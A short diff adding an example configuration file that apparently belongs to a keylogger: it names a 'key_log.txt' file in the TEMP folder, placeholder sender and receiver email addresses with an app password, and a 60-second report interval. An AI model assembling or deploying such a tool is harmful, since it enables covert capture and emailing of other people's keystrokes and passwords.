@@ -1,0 +1,11 @@
+# config.py.example
+
+import os
+
+LOG_FILE = os.path.join(os.getenv('TEMP'), "key_log.txt")
+
+SENDER_EMAIL = "your-email@example.com"
+EMAIL_PASSWORD = "your-app-password" # Get this from Google App Passwords
+RECEIVER_EMAIL = "your-receiver@example.com"
+
+SEND_REPORT_EVERY = 60 # Seconds
